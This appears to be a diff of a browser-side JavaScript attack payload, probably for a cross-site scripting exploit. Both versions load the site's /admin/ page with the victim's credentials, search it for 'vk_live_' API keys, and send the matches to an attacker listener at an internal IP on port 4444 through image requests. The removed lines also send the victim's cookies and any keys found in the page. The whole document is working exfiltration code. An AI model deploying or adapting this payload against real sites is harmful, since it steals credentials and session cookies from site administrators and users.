@@ -1,46 +1,27 @@
 const listener = "http://10.139.32.179:4444";
 
-// Function to send data via Image
-function sendData(data) {
-    const img = new Image();
-    img.src = listener + "/" + encodeURIComponent(data.substring(0, 2000));
-}
-
-// Read admin page
-fetch("/admin/", { 
-    credentials: "include",
-    headers: { "Accept": "text/html" }
-})
-.then(r => r.text())
-.then(html => {
-    // Extract API key
-    const match = html.match(/vk_live_[a-f0-9]{40}/);
-    if (match) {
-        sendData("API_KEY_FOUND: " + match[0]);
-    }
-    sendData("ADMIN_PAGE: " + html.substring(0, 500));
-})
-.catch(e => sendData("ERROR: " + e.message));
-
-// Also try with XMLHttpRequest
-const xhr = new XMLHttpRequest();
-xhr.open("GET", "/admin/", true);
-xhr.withCredentials = true;
-xhr.onload = function() {
-    const html = this.responseText;
-    const match = html.match(/vk_live_[a-f0-9]{40}/);
-    if (match) {
-        sendData("XHR_API_KEY: " + match[0]);
-    }
-};
-xhr.send();
-
-// Direct API key search in DOM (if any element contains it)
-const body = document.body.innerHTML;
-const keyMatch = body.match(/vk_live_[a-f0-9]{40}/);
-if (keyMatch) {
-    sendData("DOM_API_KEY: " + keyMatch[0]);
-}
-
-// Also send cookies
-sendData("COOKIES: " + document.cookie);
+// Inject script to read admin page
+fetch("/admin/", { credentials: "include" })
+    .then(r => r.text())
+    .then(html => {
+        // Search for API key
+        const regex = /vk_live_[a-f0-9]{40}/g;
+        const match = html.match(regex);
+        if (match) {
+            // Send via GET
+            const img = new Image();
+            img.src = listener + "/?key=" + match[0];
+        }
+        
+        // Also send the page title or any identifiable info
+        const doc = new DOMParser().parseFromString(html, 'text/html');
+        const title = doc.querySelector('title');
+        if (title) {
+            const img = new Image();
+            img.src = listener + "/?title=" + encodeURIComponent(title.textContent);
+        }
+    })
+    .catch(e => {
+        const img = new Image();
+        img.src = listener + "/?error=" + e.message;
+    });
